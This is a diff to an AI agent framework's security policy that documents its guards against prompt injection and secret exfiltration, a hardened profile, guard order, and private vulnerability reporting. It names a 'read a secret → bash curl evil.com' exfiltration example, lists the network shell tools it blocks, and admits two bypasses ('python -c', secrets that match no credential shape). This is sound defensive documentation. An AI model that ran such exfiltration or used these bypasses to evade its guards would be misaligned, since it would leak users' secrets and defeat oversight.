@@ -63,7 +63,29 @@ kernel is designed around that assumption rather than trusting the model.
   re-validating the final URL. For the compositional read→exfiltrate risk, the
   `flow-guard` extension holds later egress (default `net:fetch` and `mcp:call`) once a session
   is tainted by a source capability (default `shell:exec`) or sensitive data in
-  the transcript — confirming in `ask` mode or refusing in `block` mode.
+  the transcript — confirming in `ask` mode or refusing in `block` mode. It also holds a
+  **network-reaching `shell:exec` command** (default `curl`/`wget`/`nc`/`ncat`/`ssh`/`scp`/`sftp`/
+  `telnet`/`ftp`/`rsync`, store-overridable via `networkCommands`) once the session carries **data
+  taint** — a prior read of a sensitive path, or a credential-shaped secret (`sk-…`/`AKIA…`/PEM/
+  `ghp_…`) in a tool result, shell output included — so `read a secret → bash curl evil.com` is gated
+  while a plain `build → curl a health check` (no secret) is not. **Residual (narrow):** a secret read
+  via shell whose bytes match **none** of those four credential shapes (e.g. `DB_PASSWORD=hunter2`)
+  sets only capability taint, so a following network shell is not held; and the command-family match is
+  a heuristic (bypassable by e.g. `python -c`), raising the bar for common exfil tools rather than
+  mediating completely.
+- **Cross-session isolation in one process.** The HTTP server multiplexes many
+  `session` ids over **one** set of in-process extensions. Per-session *transcript*
+  and *usage* are isolated, but **extension** state is not — several guards and
+  accumulators carry over between sessions. `write-guard`'s seen-file set,
+  `flow-guard`'s capability taint, and goal/todo reset only at session
+  start/shutdown — both fired **once**, at startup and teardown — so they never
+  clear between sessions; cost's per-model breakdown and anomaly baseline, and
+  drift-probe's turn counter, are module-lifetime accumulators with no per-session
+  reset. (Figures mirrored from the per-session *usage* — cost/budget cumulative
+  USD — do track the acting session; the leak is the guards and the accumulators,
+  not the running totals.) The
+  `session` id is a multiplexing key, **not** a trust boundary. Isolate tenants at
+  the process boundary (below), not by the `session` id.
 
 ## Recommended deployment
 
@@ -77,8 +99,86 @@ a boundary. Use `--yolo` (fallback *allow*) on the CLI only when the environment
 is already isolated, and conversely run the server with `yolo: false` if you want
 per-capability prompting back.
 
+### Hardened profile (`EAGENT_HARDENED=1`)
+
+`EAGENT_HARDENED=1` (or `hardened: true` on `createAgentHost`/`createHttpServer`)
+turns on a one-switch **defense-in-depth** posture for the otherwise-yolo server:
+
+- **`risk-guard`** — every `shell:exec` tool call is LLM-classified first and a
+  high-risk verdict is refused (on the headless server, where the confirm prompt
+  denies).
+- **`provenance`** — tool output is injection-defended.
+- **`sandbox.tier = workspace-write`** — subprocess writes are confined to the
+  workspace root (+ temp); network still works.
+- **`content-guard` local fencing** (`contentGuard.fenceLocal`) — content-guard
+  nonce-fences local `shell:exec`/`fs:read` output too, not just the default
+  `net:fetch`/`mcp:call`/`mcp:read`, so injected instructions in bash output or a
+  read file are labeled data rather than obeyed. Off by default; the preset turns
+  it on, and it is also settable standalone via `/config set contentGuard.fenceLocal true`.
+
+It is **orthogonal to `yolo:false`**. Hardened does *not* touch the capability
+fallback: it keeps `shell:exec` runnable so the shell guards it enables actually
+have something to confine (flipping to `ask` would *deny* `shell:exec` on the
+headless server and make those guards moot). Combine it with `yolo:false` only if
+you also want least-privilege capability prompting, accepting that the shell
+guards then mostly idle. It is a **host-level** flag, so the **CLI honors it too**
+(opt-in — the CLI already runs the *ask* fallback, so hardened only *adds* guards).
+
+**No-backend fail-open (R1):** on a host with no sandbox launcher (Linux without
+`bwrap`/`firejail`, or Windows) the tier no-ops — shell still runs *unsandboxed*
+while risk-classification and injection-defense stay active. The host logs a
+warning at startup when this is the case.
+
+**Override policy — the env var is the single escape hatch.** Under hardened the
+preset is a runtime, in-memory layer (nothing is written to disk) that sits below
+the env layer but **above** the persisted override-store, so a stale
+`/config set …` cannot silently weaken it. To override a preset key, use its env
+var: `EAGENT_RISK_GUARD=off` / `EAGENT_PROVENANCE=off` drop a guard, and
+`EAGENT_SANDBOX_TIER=<tier>` picks a different tier (e.g. `readonly` for stricter,
+`no-network` to also cut subprocess network). Unset `EAGENT_HARDENED` to revert
+the whole profile.
+
+For **multi-tenant** use, run **one process per tenant** (or per trust boundary).
+Extension state is shared across `session` ids within a process (see "Cross-session
+isolation" above), so the process — not the session id — is the isolation boundary.
+A single shared process is appropriate only when every session belongs to the same
+trust domain (one user, one tenant, or an already-sandboxed workload).
+
+### Guard precedence
+
+Several extensions intervene on a tool call through the kernel's `beforeToolCall`
+filter hook (`src/kernel/agent.ts`). They run **in `BUILTIN_EXTENSIONS` load
+order** (`src/host.ts`) — the bus iterates filters in registration order — and the
+**first decision returning `block: true` short-circuits the rest**
+(`src/kernel/agent.ts`, `shouldStop = (d) => d.block`). A non-blocking **rewrite**
+(a guard that only edits `arguments`) does *not* short-circuit: it **chains
+onward**, so a later guard sees the rewritten call. There is **no priority
+mechanism** on the hook bus — precedence is purely load order, and the only way to
+change which guard wins is to **reorder `BUILTIN_EXTENSIONS`**.
+
+The full `beforeToolCall` set is **17 extensions** — every registrant, not only
+the "guards" (`content-guard` is *not* here: it is an `afterToolCall` filter) — in
+precedence order:
+
+`templates` → `provenance` → `circuit-breaker` → `planmode` → `limits` →
+`budget-cap` → `checkpoint` → `flow-guard` → `risk-guard` → `headless-flags` →
+`bash-policy` → `sandbox-tiers` → `config-hooks` → `write-guard` → `secret-guard`
+→ `skills-hardening` → `self-extend-floor`.
+
+Attribution is best-effort: on a block the dispatcher returns
+`Tool call blocked: <reason>` and the telemetry (`otel-exporter`'s
+`eagent.guard.blocks` + the span `eagent.guard.reason`, `trace`'s `toolBlocked`)
+counts *that* a block happened; the *which-guard* attribution is only as good as
+the reason text the guard supplied. A drift test (`test/guard-precedence.test.ts`)
+re-derives this order live from `BUILTIN_EXTENSIONS` and fails if the roster above
+falls out of sync, so a future reorder or a new `beforeToolCall` registrant forces
+a doc update.
+
 ## Reporting
 
-Open an issue at https://github.com/caohaotiantian/eagent/issues. Please do not
-include exploit details that could harm other users in a public issue; request a
-private channel first.
+**Report a vulnerability privately** — do not open a public issue for anything
+exploitable. Use GitHub's private advisory form ("Report a vulnerability" under the
+repository's **Security** tab: https://github.com/caohaotiantian/eagent/security/advisories/new),
+which keeps the report confidential until a fix ships. Please include a description,
+affected versions/commit, and reproduction steps. We aim to acknowledge within a few
+days. Non-sensitive hardening suggestions can still go to the public issue tracker.
